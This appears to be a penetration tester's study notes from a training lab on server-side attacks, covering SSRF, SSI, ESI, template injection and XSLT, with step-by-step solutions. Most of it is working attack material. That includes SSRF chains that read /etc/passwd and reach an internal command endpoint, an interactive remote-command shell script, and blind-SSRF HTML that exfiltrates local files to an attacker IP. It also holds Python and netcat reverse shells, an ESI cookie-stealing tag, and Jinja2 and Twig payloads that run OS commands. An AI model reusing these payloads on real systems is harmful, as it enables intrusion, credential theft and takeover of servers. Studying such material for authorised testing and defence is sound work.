1. Abusing Intermediary Applications
2. Server-Side Request Forgery (SSRF)
3. Server-Side Includes Injection (SSI)
4. Edge-Side Includes Injection (ESI)
5. Server-Side Template Injection (SSTI)
6. Extensible Stylesheet Language Transformations Server-Side Injection (XSLT)
------------------------------------
10.129.50.167

nmap -sT -T5 --min-rate=10000 -p- <TARGET IP>  
curl -i -s http://<TARGET IP>
We can see the request REDIRECTED to /load?q=index.html, meaning the q parameter fetches the resource index.html. 
curl -i -s -L http://<TARGET IP>
The spawned target is ubuntu-web.lalaguna.local, and internal.app.local is an application on the internal network
Netcat listener 
nc -nvlp 8080

Curl - Testing for SSRF
curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8080"

Netcat Listener - Confirming SSRF
User-Agent: Python-urllib/3.8

Reading the Python-urllib documentation, we can see it supports file, http and ftp schemas.
We can test this functionality through the steps below:
1.Create a file called index.html and 
<html>
</body>
<a>SSRF</a>
<body>
<html>
2. run inside - python3 -m http.server 9090
3. Inside the directory where index.html is located, start an FTP Server via the following command - Start FTP Server -
sudo pip3 install twisted
sudo python3 -m twisted ftp -p 21 -r .

Retrieve index.html through the target application using the ftp schema, as follows
curl -i -s "http://<TARGET IP>/load?q=ftp://<VPN/TUN Adapter IP>/index.html"

Retrieving a remote file through the target application - HTTP Schema
curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:9090/index.html"

Retrieving a local file through the target application - File Schema
curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd" 


1. Generate a wordlist containing all possible ports.
for port in {1..65535};do echo $port >> ports.txt;done

curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:1"

Port Fuzzing
ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30
We have received a valid response for port 5000. Let us check it as follows.

curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:5000"
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"

ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"

curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"
After code investigation:
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a"

sudo apt-get install jq
echo "encode me" | jq -sRr @uri

Function:
#!/bin/bash

function rce() {
    while true; do
        echo -n "# "; read cmd
        ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
        curl -s -o - "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
        echo ""
    done
}
rce
# uname -a; hostname; whoami

-------------------------BLIND SSRF EXPLOITATION EXAMPLE----------------------
10.129.87.175

Upload html documentation
1.
<!DOCTYPE html>
<html>
<body>
	<a>Hello World!</a>
	<img src="http://10.10.14.15:9090/x?=viaimgtag">
</body>
</html>

nc -lvnp 9090
we are getting: wkhtmltopdf (https://wkhtmltopdf.org/downloads.html) in the User-Agent 

2.
<html>
    <body>
        <b>Exfiltration via Blind SSRF</b>
        <script>
        var readfile = new XMLHttpRequest(); // Read the local file
        var exfil = new XMLHttpRequest(); // Send the file to our server
        readfile.open("GET","file:///etc/passwd", true); 
        readfile.send();
        readfile.onload = function() {
            if (readfile.readyState === 4) {
                var url = 'http://10.10.14.15:9090/?data='+btoa(this.response);
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        readfile.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
     </body>
</html>

nc -lvnp 9090 -> we are getting base64 encoded
echo """cm9vdDp4OjA6MDpyb290Oi9yb<SNIP>""" | base64 -d

3.
export RHOST="10.10.14.15";export RPORT="9090";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
WE NEED TO ENCODE IT TWICE!!!!
https://www.urlencoder.org/

export%2520RHOST%253D%252210.10.14.15%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527

<html>
    <body>
        <b>Reverse Shell via Blind SSRF</b>
        <script>
        var http = new XMLHttpRequest();
        http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.14.15%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527", true); 
        http.send();
        http.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
    </body>
</html>

nc -nvlp 9090
Bingo ROOT!!!

--------------------------SSI Injection Exploitation Example-------------------
Server-side includes (SSI) is a technology used by web applications to create dynamic content on HTML pages before loading or during the rendering process by evaluating SSI directives.
The use of SSI on a web application can be identified by checking for extensions such as .shtml, .shtm, or .stm.
// Date
<!--#echo var="DATE_LOCAL" -->

// Modification date of a file
<!--#flastmod file="index.html" -->

// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->

// Including a footer
<!--#include virtual="/footer.html" -->

// Executing commands
<!--#exec cmd="ls" -->

// Setting variables
<!--#set var="name" value="Rich" -->

// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->

// Including files (same directory)
<!--#include file="file_to_include.html" -->

// Print all variables
<!--#printenv -->

1. <!--#echo var="DATE_LOCAL" -->
2. <!--#printenv -->

Reverse Shell (Its not possible due network restrictions):
<!--#exec cmd="mkfifo /tmp/foo;nc 10.10.14.15 8888 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

    mkfifo /tmp/foo: Create a FIFO special file in /tmp/foo
    nc <IP> <PORT> 0</tmp/foo: Connect to the pentester machine and redirect the standard input descriptor
    | bin/bash 1>/tmp/foo: Execute /bin/bash redirecting the standard output descriptor to /tmp/foo
    rm /tmp/foo: Cleanup the FIFO file

Solution:
<!--#exec cmd="cat .htaccess.flag" -->

--------------------Useful ESI tags ---------------------------------------
https://gosecure.ai/blog/2018/04/03/beyond-xss-edge-side-include-injection/

// Basic detection
<esi: include src=http://<PENTESTER IP>>

// XSS Exploitation Example
<esi: include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>>

// Cookie Stealer (bypass httpOnly flag)
<esi: include src=http://<PENTESTER IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>


-------------------Server Side Template Injections------------------------
{7*7}
${7*7}
#{7*7}
%{7*7}
{{7*7}}

tpmap
https://github.com/epinna/tplmap
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

---------------EXAMPLE 1:
Twig:
{{_self.env.display("TEST")}}

git clone https://github.com/epinna/tplmap.git
cd tplmap
pip install virtualenv
virtualenv -p python2 venv
source venv/bin/activate
pip install -r requirements.txt
./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john


PAYLOAD:
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}

curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}' http://94.237.56.188:46724/
We are getting the same results as:
./tplmap.py -u '94.237.56.188:46724' -d name=john --os-shell Solution 2!
Solution:
curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("env")}}' http://94.237.56.188:46724/

-----------------EXAMPLE 2:
try {7*7} - no success, same request we have tried with curl:
curl -X POST -d 'email=${7*7}' http://<TARGET IP>:<PORT>/jointheteam, but with one  more parenthesis it seems vulnerable:
curl -X POST -d 'email={{7*7}}' http://<TARGET IP>:<PORT>/jointheteam

curl -X POST -d 'email={{7*7}}' http://<TARGET IP>:<PORT>/jointheteam

If we tried Twif or Jinja2 we are getting 500:
curl -X POST -d 'email={{7*7}}' http://<TARGET IP>:<PORT>/jointheteam
curl -X POST -d 'email={{config.items()}}' http://<TARGET IP>:<PORT>/jointheteam
curl -X POST -d 'email={{ [].class.base.subclasses() }}' http://<TARGET IP>:<PORT>/jointheteam

curl -X POST -d "email={% import os %}{{os.system('whoami')}}" http://<TARGET IP>:<PORT>/jointheteam
Tornado is with success!:
curl -X POST -d 'email={{ [].class.base.subclasses() }}' http://<TARGET IP>:<PORT>/jointheteam
./tplmap.py -u 'http://<TARGET IP>:<PORT>/jointheteam' -d email=blah

-----------------EXAMPLE 3:
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={7*7}"
curl -gs 'http://<TARGET IP>:<PORT>/execute?cmd=${7*7}'
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={{7*7}}" = Bingo
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={{7*'7'}}"

./tplmap.py -u 'http://<TARGET IP>:<PORT>/execute?cmd'
we are getting vulnerable on Jinja2

import flask
s = 'test'
type(s)
s.__class__
dir(s)

>>> s.__class__.__class__
>>> s.__class__.__base__
>>> s.__class__.__base__.__subclasses__()
>>> s.__class__.mro()[1].__subclasses__()

>>> ''.__class__.__mro__[1].__subclasses__()

Interacting:
{{ ''.__class__ }}
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__%20%7D%7D"

Payload:
{{ ''.__class__.__mro__ }}
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"

{{ ''.__class__.__mro__[1]
curl -gs "http://<TARGET  IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D" 

{{ ''.__class__.__mro__[1].__subclasses__() }}
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%20%7D%7D"

{% for i in range(450) %} 
{{ i }}
{{ ''.__class__.__mro__[1].__subclasses__()[i].__name__ }} 
{% endfor %}
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%25%20for%20i%20in%20range%28450%29%20%25%7D%20%7B%7B%20i%20%7D%7D%20%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5Bi%5D.__name__%20%7D%7D%20%7B%25%20endfor%20%25%7D"

{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').system("touch /tmp/test1") }}
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.system%28%22touch%20%2Ftmp%2Ftest1%22%29%20%7D%7D"

{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('ls /tmp').read()}}
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%27ls%20%2Ftmp%27%29.read%28%29%7D%7D"

{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{lipsum.__globals__.os.popen('id').read()}}

Solution 1:
{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('python -c \'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<PENTESTER_IP>",<PENTESTER_PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'').read()}}
Solution 2:
./tplmap.py -u 'http://Server IP:Port/execute?cmd=blah' --os-shell

-------------------Attacking XSLT ----------------------
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt

------------Skill assessment:
go to source code -> jquery.js -> base 64 encrypted values
DECODE them online (getting reverted results) or Decodify tool:
./dcode Ly86cHR0aA== > http://
./dcode dHNvaC5ub2l0YWNvbC53b2RuaXc= > window.location.host
./dcode dHh0LmVnYXNzZW0vMDgwODoxLjAuMC43MjEvLzpwdHRoPXQzM2w/M000M2wxRnQ0aFR0M0cv > =/G3tTh4tF1l34M3?l33t=http://127.0.0.1:8080/message.txt 

http://83.136.253.251:40591/G3tTh4tF1l34M3?l33t=file:///etc/passwd
http://83.136.253.251:40591/G3tTh4tF1l34M3?l33t=http://127.0.0.1:8080/flag.txt 
